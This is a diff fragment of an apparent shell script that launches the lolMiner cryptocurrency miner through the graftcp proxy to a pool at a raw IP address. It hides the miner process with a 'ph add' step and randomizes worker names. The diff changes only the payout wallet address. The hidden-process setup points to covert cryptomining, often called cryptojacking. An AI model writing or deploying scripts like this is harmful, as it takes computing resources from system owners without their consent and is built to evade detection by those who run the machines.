@@ -39,4 +39,4 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool 167.71.96.194:3333 --user BABYDOGE:0xfdd8345f20C78BF14D1af01d5F7EA1DA1744fCD1.$(echo $(shuf -i 1-999 -n 1)-LOL) --ethstratum ETHPROXY
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool 167.71.96.194:3333 --user ELON:0xc642a16535fcbd0cc459e91dcb7cffce0381f806.$(echo $(shuf -i 1-999 -n 1)-LOL) --ethstratum ETHPROXY
